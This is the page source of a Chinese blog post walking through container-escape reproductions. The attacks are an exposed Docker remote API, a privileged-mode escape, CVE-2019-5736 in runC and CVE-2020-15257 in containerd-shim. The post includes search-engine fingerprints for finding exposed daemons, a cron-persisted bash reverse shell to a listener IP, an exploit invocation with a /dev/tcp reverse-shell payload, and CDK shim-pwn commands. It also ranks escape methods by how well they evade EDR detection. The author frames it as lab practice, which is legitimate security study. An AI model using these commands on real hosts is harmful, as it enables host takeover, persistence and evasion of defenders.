@@ -1,0 +1,403 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>k8s学习及漏洞复现-下 | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.1docker remote api (2375)k8s与docker总是并行出现的，那么如果docker出现问题，也将是严重的。这里笔者学习复现一下docker的漏洞，docker远程访问漏洞。fofa指纹app=&amp;quot;docker-Daemon&amp;quot; shodan..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2024/01/10/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-3Z9EQ7RWNS')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'k8s学习及漏洞复现-下',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/k8s/UzJuMarkDownImage89bb8f54fc5c96249c42867fbf9e8b88.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">k8s学习及漏洞复现-下</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">k8s学习及漏洞复现-下</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-10T02:54:50.000Z" title="发表于 2024-01-10 10:54:50">2024-01-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-01T08:12:22.610Z" title="更新于 2024-03-01 16:12:22">2024-03-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3,298</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h6 id="1-1docker-remote-api-2375"><a href="#1-1docker-remote-api-2375" class="headerlink" title="1.1docker remote api (2375)"></a>1.1docker remote api (2375)</h6><p>k8s与docker总是并行出现的，那么如果docker出现问题，也将是严重的。这里笔者学习复现一下docker的漏洞，docker远程访问漏洞。<br><code>fofa指纹app=&quot;docker-Daemon&quot; shodan **port:”2375″ country:”JP” Docker**</code><br>测试是否存在漏洞，这里可以看到，fofa出来的并不是都是2375端口，也可能是附近的，都一样，正常是404，然后加个version，或者<code>2376/containers/json</code>出现信息，也可证明存在漏洞<br><img src="/images/k8s/image-20240111103740807.png" alt="image-20240111103740807"></p>
+<p><img src="/images/k8s/image-20240111103917111.png" alt="image-20240111103917111"></p>
+<p><img src="/images/k8s/image-20240111104146653.png" alt="image-20240111104146653"></p>
+<p>也可以使用命令进行获取到相关容器。</p>
+<p><img src="/images/k8s/image-20240111141859943.png" alt="image-20240111141859943"></p>
+<h6 id="1-2搭建本地漏洞"><a href="#1-2搭建本地漏洞" class="headerlink" title="1.2搭建本地漏洞"></a>1.2搭建本地漏洞</h6><p>接下来的操作没有授权，就搭建了一个环境，使用vulhub搭建，很方便。<code>https://github.com/vulhub/vulhub</code>，安装完docker即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /vulhub/docker/unauthorized-rce</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>这里我们pull一个镜像，这里报了一个错，Using default tag: latest<br>Error response from daemon: missing signature key，大概意思是本机docker版本低或者高，镜像版本低或者高，然后镜像和docker不匹配不兼容，那么很好解决，简单解决方法去hub.docker.com，搜一下镜像，然后拉去低版本的，复杂的，更新docker。</p>
+<h6 id="1-3利用过程"><a href="#1-3利用过程" class="headerlink" title="1.3利用过程"></a>1.3利用过程</h6><p><img src="/images/k8s/image-20240111143119711.png" alt="image-20240111143119711"></p>
+<p><img src="/images/k8s/image-20240111143520435.png" alt="image-20240111143520435"></p>
+<p><img src="/images/k8s/image-20240111143543713.png" alt="image-20240111143543713"></p>
+<p>加上版本号在pull即可，这里不一定必须要拉这个，其他的也一样用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.241.142:2375 run -it --privileged busybox:1.27.0  /bin/sh</span><br><span class="line"></span><br><span class="line">#在kali中启动一个有交互的shell，并且是特权镜像</span><br><span class="line">#当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</span><br><span class="line">也就是常说的特权模式。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/k8s/image-20240111144005712.png" alt="image-20240111144005712"></p>
+<h6 id="1-4特权模式逃逸"><a href="#1-4特权模式逃逸" class="headerlink" title="1.4特权模式逃逸"></a>1.4特权模式逃逸</h6><p>然后在进行逃逸即可。最简单的，挂载主机硬盘。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># mkdir bohemian</span></span><br><span class="line">/ <span class="comment"># mount /dev/vda1 /bohemian</span></span><br><span class="line">/ <span class="comment"># ls /bohemian</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/192.168.241.128/6666 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chmod +x s.sh </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * *  /bohemian/s.sh&#x27;</span> &gt;&gt; /bohemian/var/spool/cron/crontabs/root <span class="comment">#每分钟执行一次 文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者passwd写用户也是常见的写后门的一种方法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">值得一提的是</span><br><span class="line"></span><br><span class="line">从对抗的层面上，不建议将逃逸的行为当成可以写入宿主机特定文件 (如 /etc/cron*, /root/.ssh/authorized_keys 等文件) 的行为，应该根据目标选择更趋近与业务行为的手法，容器逃逸的利用手段会比大部分情况下的命令执行漏洞利用要灵活。</span><br><span class="line"></span><br><span class="line">以目标 “获取宿主机上的配置文件” 为例，以下几种逃逸手法在容易在防御团队中暴露的概率从大到小，排序如下(部分典型手法举例，不同的 EDR 情况不同)：</span><br><span class="line"></span><br><span class="line">mount /etc + write crontab</span><br><span class="line">mount /root/.ssh + write authorized_keys</span><br><span class="line">old CVE/vulnerability exploit</span><br><span class="line">write cgroup notify_on_release</span><br><span class="line">write procfs core_pattern</span><br><span class="line">volumeMounts: / + chroot</span><br><span class="line">remount and rewrite cgroup</span><br><span class="line">websocket/sock shell + volumeMounts: /path</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/k8s/image-20240111144206581.png" alt="image-20240111144206581"></p>
+<p><img src="/images/k8s/image-20240111150221566.png" alt="image-20240111150221566"></p>
+<h6 id="1-6总结："><a href="#1-6总结：" class="headerlink" title="1.6总结："></a>1.6总结：</h6><p>个人感觉在实战中，这个未授权出现的不多了，fofa后，访问了几个20个感觉有五个左右。</p>
+<h5 id="2-docker-runC容器逃逸-CVE-2019-5736复现"><a href="#2-docker-runC容器逃逸-CVE-2019-5736复现" class="headerlink" title="2.docker:runC容器逃逸-CVE-2019-5736复现"></a>2.<strong>docker:runC容器逃逸-CVE-2019-5736复现</strong></h5><h6 id="2-1漏洞原理"><a href="#2-1漏洞原理" class="headerlink" title="2.1漏洞原理"></a>2.1漏洞原理</h6><p>漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p>
+<h6 id="2-2环境部署"><a href="#2-2环境部署" class="headerlink" title="2.2环境部署"></a>2.2环境部署</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-5736</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/k8s/image-20240112143301977.png" alt="image-20240112143301977"></p>
+<h6 id="2-3漏洞影响版本"><a href="#2-3漏洞影响版本" class="headerlink" title="2.3漏洞影响版本"></a>2.3漏洞影响版本</h6><ul>
+<li><p>runC &lt; 1.0-rc6 （docker &lt; 18.09.2）</p>
+</li>
+<li><p><img src="/images/k8s/image-20240112144834221.png" alt="image-20240112144834221"></p>
+</li>
+</ul>
+<h6 id="2-4利用条件"><a href="#2-4利用条件" class="headerlink" title="2.4利用条件"></a>2.4利用条件</h6><p>需要在容器内具有 root 权限，才能覆盖runC文件，可能需要配合钓鱼等等手法，让对面的管理员执行命令进入容器，也就是<code>docker run -it ubuntu /bin/bash</code>，</p>
+<h6 id="2-5利用过程"><a href="#2-5利用过程" class="headerlink" title="2.5利用过程"></a>2.5利用过程</h6><p>然后的利用流程是，拉去一个Ubuntu的镜像，默认metarget帮我们拉好了，<br>然后·<code>docker run -it ubuntu /bin/bash</code>起一个镜像，<br>另起一个终端，<code>docker ps</code>,看一下containerid<br>这里起容器的时候注意，要加-it，如果想后台运行的话，也要加-d，不然exit后会退出来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br></pre></td></tr></table></figure>
+<p><img src="/images/k8s/image-20240115153503004.png" alt="image-20240115153503004"></p>
+<p>去这里下载一下poc,用go编译，注意这里这个poc不需要将payload放在文件中，利用的时候直接终端中获取。</p>
+<p><code>https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go</code></p>
+<p>模拟获取到容器的权限，然后上传poc。</p>
+<p><code>docker cp cve-2019-5736 7a6c5438f435:/</code></p>
+<p>加一个权限，然后执行要执行的命令就可</p>
+<p><code>./cve-2019-5736 -shell &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2233 0&gt;&amp;1&quot;</code></p>
+<p><img src="/images/k8s/image-20240115171916605.png" alt="image-20240115171916605"></p>
+<p><img src="/images/k8s/image-20240115171940936.png" alt="image-20240115171940936"></p>
+<p><img src="/images/k8s/image-20240115172023103.png" alt="image-20240115172023103"></p>
+<p>同时vps监听，这里一定要注意，笔者在第一次测试的时候输错了命令，然后，再去想执行其他命令的时候，会报错，也就是，可能docker-runc这个组件被打崩了。</p>
+<p>执行<code>tail -c 100 /usr/bin/docker-runc | xxd</code>可以看到，runc被更改了。</p>
+<p><img src="/images/k8s/image-20240115172218627.png" alt="image-20240115172218627"></p>
+<p>runc崩了，就进不去容器了</p>
+<p><img src="/images/k8s/image-20240112160934960.png" alt="image-20240112160934960"></p>
+<h6 id="2-6总结"><a href="#2-6总结" class="headerlink" title="2.6总结"></a>2.6总结</h6><p>漏洞的实现难点在于，需要在宿主主机上执行一下进入可控容器的步骤，这一步实现起来相对比较难。<br>还有就是，实战中如果真的条件允许的话，runc会被更改，可能会影响业务，这是很难受的。</p>
+<h5 id="3-CVE-2020-15257-host模式容器逃逸漏洞"><a href="#3-CVE-2020-15257-host模式容器逃逸漏洞" class="headerlink" title="3.CVE-2020-15257-host模式容器逃逸漏洞"></a>3.CVE-2020-15257-host模式容器逃逸漏洞</h5><h6 id="3-1前置知识：docker网络-Docker配置不当导致的容器逃逸"><a href="#3-1前置知识：docker网络-Docker配置不当导致的容器逃逸" class="headerlink" title="3.1前置知识：docker网络,Docker配置不当导致的容器逃逸"></a>3.1前置知识：docker网络,Docker配置不当导致的容器逃逸</h6><p>这里我们再次提到NameSpace和cgroups</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux 命名空间（NameSpace）：实现文件系统、网络、进程、主机名等方面的隔离</span><br><span class="line">Linux 控制组（cgroups）：实现 CPU、内存、硬盘等方面的隔离</span><br></pre></td></tr></table></figure>
+
+<p>如果设定了以下配置就会导致相应的隔离机制失效：</p>
+<p>其实原理很简单,就是通过权限的变更打破了原来的文件系统、网络、进程、主机名等方面的隔离</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</span><br><span class="line"></span><br><span class="line">--net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</span><br><span class="line"></span><br><span class="line">--pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</span><br><span class="line"></span><br><span class="line">--volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</span><br></pre></td></tr></table></figure>
+
+<p>当你安装完Docker时，它会自动创建三个网络。你可以使用以下<code>docker network ls</code>命令列出这些网络：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure>
+
+<p>结果应如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NETWORK ID          NAME                       DRIVER              <span class="keyword">SCOPE</span></span><br><span class="line"><span class="number">92</span>d50b6667c7        bridge                     bridge              <span class="keyword">local</span></span><br><span class="line"><span class="number">01</span>f9f326e362        host                       host                <span class="keyword">local</span></span><br><span class="line"><span class="number">1</span>b3137177ee1        <span class="keyword">none</span>                       <span class="keyword">null</span>                <span class="keyword">local</span></span><br><span class="line">f646c93ba617        unauthorized<span class="operator">-</span>rce_default   bridge              <span class="keyword">local</span></span><br></pre></td></tr></table></figure>
+
+<p>Docker内置这三个网络，运行容器时，你可以使用该来指定容器应连接到哪些网络。</p>
+<p>我们在使用docker run创建Docker容器时，可以用<code>--network</code>标志 选项指定容器的网络模式，Docker有以下4种网络模式：<br>host模式：使用 –net=host 指定。<br>none模式：使用 –net=none 指定。<br>bridge模式：使用 –net=bridge 指定，默认设置。<br>container模式：使用 –net=container:NAME_or_ID 指定。</p>
+<p>Docker使用了Linux的Namespaces技术来进行资源隔离，如PID Namespace隔离进程，Mount Namespace隔离文件系统，Network Namespace隔离网络等。一个Network Namespace提供了一份独立的网络环境，包括网卡、路由、Iptable规则等都与其他的Network Namespace隔离。</p>
+<p>host模式类似于Vmware的桥接模式，与宿主机在同一个网络中，但没有独立IP地址。一个Docker容器一般会分配一个独立的Network Namespace。但如果启动容器的时候使用host模式，那么这个容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。</p>
+<p>容器与主机在相同的网络命名空间下面，使用相同的网络协议栈，容器可以直接使用主机的所有网络接口。</p>
+<h6 id="3-2containerd-shim"><a href="#3-2containerd-shim" class="headerlink" title="3.2containerd-shim"></a>3.2containerd-shim</h6><p>在进一步了解漏洞原理之前， 我们需要了解一下啊 <strong>containerd-shim</strong> 是什么？</p>
+<p>在 1.11 版本中，Docker 进行了重大的重构，由单一的 Docker Daemon，拆分成了 4 个独立的模块：Docker Daemon、containerd、containerd-shim、runC</p>
+<p>其中，containerd 是由 Docker Daemon 中的容器运行时及其管理功能剥离了出来。docker 对容器的管理和操作基本都是通过 containerd 完成的。containerd就是docker前面的那个号。</p>
+<p><img src="/images/k8s/image-20240117094901172.png" alt="image-20240117094901172"></p>
+<p>它向上为 Docker Daemon 提供了 gRPC 接口，向下通过 containerd-shim 结合 runC，实现对容器的管理控制。containerd 还提供了可用于与其交互的 API 和客户端应用程序 ctr。所以实际上，即使不运行 Docker Daemon，也能够直接通过 containerd 来运行、管理容器。</p>
+<p>而中间的 <strong>containerd-shim</strong> 夹杂在 containerd 和 runc 之间，每次启动一个容器，都会创建一个新的 containerd-shim 进程，它通过指定的三个参数：容器 id、bundle 目录、运行时二进制文件路径，来调用运行时的 API 创建、运行容器，持续存在到容器实例进程退出为止，将容器的退出状态反馈给 containerd。</p>
+<h6 id="3-3漏洞原理"><a href="#3-3漏洞原理" class="headerlink" title="3.3漏洞原理"></a>3.3漏洞原理</h6><p>由于在 host 模式下，容器与 <strong>host</strong> 共享一套 <strong>Network namespaces</strong> ，此时 <strong>containerd-shim API</strong> 暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器为 root 权限，且容器的网络模式为 <code>--net=host</code> 的时候，通过 <strong>ontainerd-shim API</strong> 可以达成容器逃逸的目的</p>
+<h6 id="3-4漏洞影响版本"><a href="#3-4漏洞影响版本" class="headerlink" title="3.4漏洞影响版本"></a>3.4漏洞影响版本</h6><p>该漏洞影响 containerd 1.3.x, 1.2.x, 1.4.x 版本</p>
+<h6 id="3-5环境搭建"><a href="#3-5环境搭建" class="headerlink" title="3.5环境搭建"></a>3.5环境搭建</h6><p>./metarget cnv install cve-2020-15257</p>
+<p>metarget实现的命令是<br>sudo docker run -it –net=host –name=15257 ubuntu /bin/bash</p>
+<p>我们用<br>docker run -d -it –net=host vulhub/thinkphp:5.0.23，起一个带漏洞的也可以</p>
+<p>./metarget cnv install cve-2020-15257</p>
+<p><img src="/images/k8s/image-20240117104127925.png" alt="image-20240117104127925"></p>
+<p><img src="/images/k8s/image-20240117104149458.png" alt="image-20240117104149458"></p>
+<p>这样就可以模拟漏洞利用然后拿root，然后逃逸了</p>
+<h6 id="3-6漏洞利用"><a href="#3-6漏洞利用" class="headerlink" title="3.6漏洞利用"></a>3.6漏洞利用</h6><p>webshell中也是可判断是否存在抽象命名空间unix域套接字。<br><code>cat /proc/net/unix|grep -a &quot;containerd-shim&quot;</code><br>出现下图中的信息，表示存在抽象命名空间unix域套接字。</p>
+<p><img src="/images/k8s/image-20240117144206246.png" alt="image-20240117144206246"></p>
+<p>从宿主主机进入到容器中</p>
+<p><img src="/images/k8s/image-20240117104701059.png" alt="image-20240117104701059"></p>
+<p>去到这里下载一下大师傅的工具，<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/tree/0.1.6%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AF%E6%9C%80%E8%80%81%E7%89%88%E6%9C%AC0.1.6%E7%9A%84%EF%BC%8C%E7%94%A8%E6%9C%80%E6%96%B0%E7%89%88%E7%9A%84%E6%8A%A5%E9%94%99%E3%80%82">https://github.com/cdk-team/CDK/tree/0.1.6，我这里下载的是最老版本0.1.6的，用最新版的报错。</a><br>然后先试下如果是webshell的话可不可以，这里经过测试好像是不可以的，会报rpc error: ttrpc: closed<br>可能是权限问题，不太清楚。</p>
+<p><img src="/images/k8s/image-20240117143535014.png" alt="image-20240117143535014"></p>
+<p>回到宿主主机，将cdk_linux_amd64同样传到容器中，<code>docker cp cdk_linux_amd64 ubuntu:18.04:/</code><br>然后加上权限执行，./cdk_linux_amd64 run shim-pwn ip 23333</p>
+<p>nc -lvvnp 23333 监听即可。<img src="/images/k8s/image-20240117144000362.png" alt="image-20240117144000362"></p>
+<p><img src="/images/k8s/image-20240117144044795.png" alt="image-20240117144044795"></p>
+<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这个漏洞要符合三个条件，一个就是containerd版本，再就是权限的问题，可能不必须要root，笔者测试的话 。webshell的权限确实没成功。最后一个，就是docker容器环境起来的时候要host模式。</p>
+<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有错误到或描述不正确的地方，期待业界师傅们指正勘误。本来是研究k8s漏洞的，奈何笔者能力有限，只研究了k8s的未授权简单的漏洞。后续如果有机会的话，在研究其他漏洞吧。</p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><pre><code>https://bestwing.me/CVE-2020-15257-anaylysis.html  CVE-2020-15257 Docker 逃逸漏洞分析
+``
+
+https://blog.csdn.net/w17791476027/article/details/132637785
+https://github.com/cdk-team/CDK/tree/0.1.6 工具
+
+https://xz.aliyun.com/t/8925?time__1311=n4%2BxuDgDBD90i%3DD7YD8DlP6e0%3D25Zg2iE%2B%2BbD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-5
+
+https://www.mylovekiki.top/?p=1033
+https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Docker/Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/
+
